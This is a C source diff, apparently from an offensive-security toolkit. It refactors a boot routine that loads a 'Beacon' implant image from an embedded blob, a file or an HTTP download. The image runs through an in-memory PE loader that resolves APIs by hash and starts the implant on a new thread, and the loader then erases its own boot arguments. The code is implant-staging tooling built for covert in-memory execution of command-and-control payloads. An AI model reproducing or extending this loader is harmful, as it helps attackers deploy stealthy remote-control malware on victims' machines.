@@ -18,7 +18,8 @@ typedef struct {
 
 static DWORD bootBeacon(BootCtx* ctx);
 
-static void* loadImage(Runtime_M* runtime);
+static errno loadConfig(Runtime_M* runtime, Config* config);
+static void* loadImage(Runtime_M* runtime, byte* config);
 static void* loadImageFromEmbed(Runtime_M* runtime, byte* config);
 static void* loadImageFromFile(Runtime_M* runtime, byte* config);
 static void* loadImageFromHTTP(Runtime_M* runtime, byte* config);
@@ -38,23 +39,24 @@ errno Boot(void* ctx)
     // reserved context and extended arguments
     (void)ctx;
 
-    // process arguments
-    bool wait = false;
-
-    // initialize PE Loader and load image
-    PELoader_M* loader = NULL;
+    // store boot configuration
+    Config config;
+    mem_init(&config, sizeof(config));
+    // initialize PE Loader for stage
+    PELoader_M* loader  = NULL;
+    HANDLE      hThread = NULL;
     errno err = NO_ERROR;
     for (;;)
     {
-        // check the Beacon version
-        uint16 version;
-        if (!runtime->Argument.GetValue(ARG_ID_VERSION, &version, NULL))
+        // load config from argument stub
+        err = loadConfig(runtime, &config);
+        if (err != NO_ERROR)
         {
-            err = ERR_NOT_FOUND_VERSION;
             break;
         }
+        // check the Beacon version
         uint32 mode = 0;
-        if (version >= 0x0400 && version < 0x0500)
+        if (config.Version >= 0x0400 && config.Version < 0x0500)
         {
             mode = BOOT_MODE_V1;
         }
@@ -63,34 +65,30 @@ errno Boot(void* ctx)
             err = ERR_UNSUPPORTED_VERSION;
             break;
         }
-        // get test option
-        if (!runtime->Argument.GetValue(ARG_ID_TEST_WAIT, &wait, NULL))
-        {
-            err = ERR_NOT_FOUND_TEST_WAIT;
-            break;
-        }
-        // load PE Image, it cannot be empty
-        void* image = loadImage(runtime);
+        // prepare pe image data to config
+        void* image = loadImage(runtime, config.Image);
         if (image == NULL)
         {
             err = GetLastErrno();
             break;
         }
-        // prevent incorrect optimization about init struct
-        PELoader_Cfg config;
-        mem_init(&config, sizeof(config));
-        config.FindAPI     = runtime->HashAPI.FindAPI_MA;
-        config.Image       = image;
-        config.IgnoreStdIO = true;
+        // prevent incorrect optimization
+        PELoader_Cfg cfg;
+        mem_init(&cfg, sizeof(cfg));
+        cfg.FindAPI        = runtime->HashAPI.FindAPI_MA;
+        cfg.Image          = image;
+        cfg.IgnoreStdIO    = true;
+        cfg.NotStopRuntime = config.TestWait;
         // load beacon image
-        loader = InitPELoader(runtime, &config);
+        loader = InitPELoader(runtime, &cfg);
         if (loader == NULL)
         {
+            mem_init(&cfg, sizeof(cfg));
             err = GetLastErrno();
             break;
         }
         runtime->Memory.Free(image);
-        mem_init(&config, sizeof(config));
+        mem_init(&cfg, sizeof(cfg));
         // initialize dll before boot beacon
         err = loader->Execute();
         if (err != NO_ERROR)
@@ -103,16 +101,21 @@ errno Boot(void* ctx)
         context->loader  = loader;
         context->mode    = mode;
         void* address = GetFuncAddr(&bootBeacon);
-        HANDLE hThread = runtime->Thread.New(address, context, true);
+        hThread = runtime->Thread.New(address, context, true);
         if (hThread == NULL)
         {
             err = GetLastErrno();
             break;
         }
-        if (!wait)
+        if (!config.TestWait)
         {
-            
+            if (!runtime->Resource.Close(hThread))
+            {
+                err = GetLastErrno();
+                break;
+            }
         }
+        runtime->Argument.EraseAll();
         break;
     }
     if (err != NO_ERROR || loader == NULL)
@@ -121,13 +124,20 @@ errno Boot(void* ctx)
         return err;
     }
 
-
-
-
-    if (!wait)
+    // wait main thread for test stage
+    if (!config.TestWait)
     {
         return NO_ERROR;
     }
+    if (!runtime->Resource.Wait(hThread, INFINITE) && err == NO_ERROR)
+    {
+        err = GetLastErrno();
+    }
+    if (!runtime->Resource.Close(hThread) && err == NO_ERROR)
+    {
+        err = GetLastErrno();
+    }
+
     // destroy pe loader and exit runtime
     errno eld = loader->Destroy();
     if (eld != NO_ERROR && err == NO_ERROR)
@@ -139,7 +149,7 @@ errno Boot(void* ctx)
 
 static DWORD bootBeacon(BootCtx* ctx)
 {
-    // copy context and free it
+    // copy arguments in context and free it
     Runtime_M*  runtime = ctx->runtime;
     PELoader_M* loader  = ctx->loader;
     uint32 mode = ctx->mode;
@@ -162,20 +172,38 @@ static DWORD bootBeacon(BootCtx* ctx)
     return 0;
 }
 
-static void* loadImage(Runtime_M* runtime)
+static errno loadConfig(Runtime_M* runtime, Config* config)
 {
-    byte*  config = NULL;
     uint32 size;
-    if (!runtime->Argument.GetPointer(ARG_ID_PE_IMAGE, &config, &size))
+    if (!runtime->Argument.GetValue(ARG_ID_VERSION, &config->Version, &size))
     {
-        SetLastErrno(ERR_NOT_FOUND_PE_IMAGE);
-        return NULL;
+        return ERR_NOT_FOUND_VERSION;
     }
-    if (config == NULL || size == 0)
+    if (size != sizeof(uint16))
     {
-        SetLastErrno(ERR_EMPTY_PE_IMAGE_DATA);
-        return NULL;
+        return ERR_INVALID_VERSION;
     }
+    if (!runtime->Argument.GetPointer(ARG_ID_PE_IMAGE, &config->Image, &size))
+    {
+        return ERR_NOT_FOUND_PE_IMAGE;
+    }
+    if (size == 0)
+    {
+        return ERR_EMPTY_PE_IMAGE_DATA;
+    }
+    if (!runtime->Argument.GetValue(ARG_ID_TEST_WAIT, &config->TestWait, &size))
+    {
+        return ERR_NOT_FOUND_TEST_WAIT;
+    }
+    if (size != sizeof(BOOL))
+    {
+        return ERR_INVALID_TEST_WAIT;
+    }
+    return NO_ERROR;
+}
+
+static void* loadImage(Runtime_M* runtime, byte* config)
+{
     byte mode = *config;
     config++;
     switch (mode)
@@ -271,29 +299,6 @@ static void* loadImageFromHTTP(Runtime_M* runtime, byte* config)
     return resp.Body.buf;
 }
 
-static errno eraseArguments(Runtime_M* runtime)
-{
-    uint32 id[] = 
-    {
-        ARG_ID_VERSION,
-        ARG_ID_PE_IMAGE,
-        ARG_ID_TEST_WAIT,
-    };
-    bool success = true;
-    for (int i = 0; i < arrlen(id); i++)
-    {
-        if (!runtime->Argument.Erase(id[i]))
-        {
-            success = false;   
-        }
-    }
-    if (success)
-    {
-        return NO_ERROR;
-    }
-    return ERR_ERASE_ARGUMENTS;
-}
-
 static Runtime_M* initRuntime(void* boot, Runtime_Opts* opts)
 {
     uintptr base = (uintptr)(GetFuncAddr(&InitPELoader));
@@ -303,12 +308,10 @@ static Runtime_M* initRuntime(void* boot, Runtime_Opts* opts)
     return init(boot, opts);
 }
 
-#pragma optimize("", off)
-
 // the size will be replaced by builder or generator
+#pragma optimize("", off)
 static uint32 pe_loader_size()
 {
     return STUB_PE_LOADER_SIZE;
 }
-
 #pragma optimize("", on)
